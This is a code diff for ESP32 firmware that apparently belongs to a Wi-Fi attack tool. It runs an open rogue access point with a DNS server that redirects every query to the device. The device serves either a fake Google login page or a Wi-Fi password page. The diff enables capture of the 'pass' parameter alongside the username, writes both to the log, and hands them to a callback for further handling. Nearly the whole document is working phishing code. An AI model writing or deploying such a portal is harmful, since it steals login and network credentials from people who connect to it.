@@ -13,13 +13,12 @@
 #include "dns_server.h"
 #include "esp_http_server.h"
 #include "portals/google.h"
+#include "portals/wifi_pass.h"
 
-#define EXAMPLE_ESP_WIFI_SSID "Hacknet_EXT"  //"NotSuspiciousAP"
-#define EXAMPLE_ESP_WIFI_PASS ""
-#define EXAMPLE_MAX_STA_CONN  4
+static char* captive_portal_html = GOOGLE_PORTAL;
 
-extern const char root_start[] asm("_binary_google_html_start");
-extern const char root_end[] asm("_binary_google_html_end");
+static wifi_config_t wifi_config;
+static captive_portal_handler_cb handler_captive_portal_cb = NULL;
 
 static const char* TAG = "captive_portal";
 
@@ -40,26 +39,17 @@ static void wifi_event_handler(void* arg,
   }
 }
 
-static void wifi_init_softap(void) {
+static void wifi_init_softap(wifi_config_t* wifi_config) {
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   ESP_ERROR_CHECK(esp_wifi_init(&cfg));
 
   ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                              &wifi_event_handler, NULL));
 
-  wifi_config_t wifi_config = {
-      .ap = {.ssid = EXAMPLE_ESP_WIFI_SSID,
-             .ssid_len = strlen(EXAMPLE_ESP_WIFI_SSID),
-             .password = "",
-             .max_connection = EXAMPLE_MAX_STA_CONN,
-             .authmode = WIFI_AUTH_WPA_WPA2_PSK},
-  };
-  if (strlen(EXAMPLE_ESP_WIFI_PASS) == 0) {
-    wifi_config.ap.authmode = WIFI_AUTH_OPEN;
-  }
+  wifi_config->ap.authmode = WIFI_AUTH_OPEN;
 
   ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-  ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
+  ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, wifi_config));
   ESP_ERROR_CHECK(esp_wifi_start());
 
   esp_netif_ip_info_t ip_info;
@@ -68,19 +58,34 @@ static void wifi_init_softap(void) {
 
   char ip_addr[16];
   inet_ntoa_r(ip_info.ip.addr, ip_addr, 16);
-  ESP_LOGI(TAG, "Set up softAP with IP: %s", ip_addr);
 
-  ESP_LOGI(TAG, "wifi_init_softap finished. SSID:'%s' password:'%s'",
-           EXAMPLE_ESP_WIFI_SSID, EXAMPLE_ESP_WIFI_PASS);
+  ESP_LOGI(TAG, "wifi_init_softap finished. %s SSID:'%s' password:'%s'",
+           ip_addr, wifi_config->ap.ssid, wifi_config->ap.password);
+}
+
+void captive_portal_set_portal(captive_portals_t portal) {
+  switch (portal) {
+    case CAPTIVE_PORTAL_GOOGLE:
+      captive_portal_html = GOOGLE_PORTAL;
+      break;
+    case CAPTIVE_PORTAL_WIFI_PASS:
+      captive_portal_html = WIFI_PASS_PORTAL;
+      break;
+    default:
+      captive_portal_html = GOOGLE_PORTAL;
+      break;
+  }
 }
 
 // HTTP GET Handler
 static esp_err_t root_get_handler(httpd_req_t* req) {
-  const uint32_t root_len = root_end - root_start;
-
   ESP_LOGI(TAG, "Serve root");
   httpd_resp_set_type(req, "text/html");
-  httpd_resp_send(req, root_start, root_len);
+  httpd_resp_send(req, captive_portal_html, strlen(captive_portal_html));
+
+  if (handler_captive_portal_cb) {
+    handler_captive_portal_cb((char*) wifi_config.ap.ssid, "", "");
+  }
 
   return ESP_OK;
 }
@@ -88,6 +93,9 @@ static esp_err_t root_get_handler(httpd_req_t* req) {
 // params: user, pass
 static esp_err_t validate_get_handler(httpd_req_t* req) {
   char* buf;
+  char* user = "";
+  char* pass = "";
+
   size_t buf_len;
   buf_len = httpd_req_get_url_query_len(req) + 1;
   if (buf_len > 1) {
@@ -96,13 +104,20 @@ static esp_err_t validate_get_handler(httpd_req_t* req) {
       char param[32];
       if (httpd_query_key_value(buf, "user", param, sizeof(param)) == ESP_OK) {
         ESP_LOGI(TAG, "Found URL query parameter -> user: %s", param);
+        user = strdup(param);
       }
-      // if (httpd_query_key_value(buf, "pass", param, sizeof(param)) == ESP_OK)
-      // {
-      //   ESP_LOGI(TAG, "Found URL query parameter -> pass: %s", param);
-      // }
+      if (httpd_query_key_value(buf, "pass", param, sizeof(param)) == ESP_OK) {
+        ESP_LOGI(TAG, "Found URL query parameter -> pass: %s", param);
+        pass = strdup(param);
+      }
     }
+    free(buf);
   }
+
+  if (handler_captive_portal_cb) {
+    handler_captive_portal_cb((char*) wifi_config.ap.ssid, user, pass);
+  }
+
   return ESP_OK;
 }
 
@@ -153,12 +168,37 @@ void captive_portal_begin() {
   esp_log_level_set("httpd_parse", ESP_LOG_ERROR);
 
   ESP_ERROR_CHECK(esp_netif_init());
-  esp_netif_create_default_wifi_ap();
-  wifi_init_softap();
+  // esp_netif_create_default_wifi_ap();
+  ESP_LOGI(TAG, "ESP_WIFI_MODE_AP %s", wifi_config.ap.ssid);
+  wifi_init_softap(&wifi_config);
   start_webserver();
 
   // Start the DNS server that will redirect all queries to the softAP IP
   dns_server_config_t config = DNS_SERVER_CONFIG_SINGLE(
       "*" /* all A queries */, "WIFI_AP_DEF" /* softAP netif ID */);
   start_dns_server(&config);
+  while (1) {
+    vTaskDelay(10 / portTICK_PERIOD_MS);
+  }
+}
+
+void captive_portal_set_config(wifi_config_t* config) {
+  ESP_LOGI(TAG, "ESP_WIFI_MODE_AP %s", config->ap.ssid);
+  wifi_config = *config;
+  ESP_LOGI(TAG, "ESP_WIFI_MODE_AP %s", (char*) wifi_config.ap.ssid);
+}
+
+static void captive_portal_dns_server_stop() {
+  ESP_LOGI(TAG, "DNS Server stopped");
+}
+
+void captive_portal_stop() {
+  stop_dns_server(captive_portal_dns_server_stop);
+  httpd_stop(NULL);
+  esp_wifi_stop();
+  esp_wifi_deinit();
+}
+
+void captive_portal_register_cb(captive_portal_handler_cb callback) {
+  handler_captive_portal_cb = callback;
 }
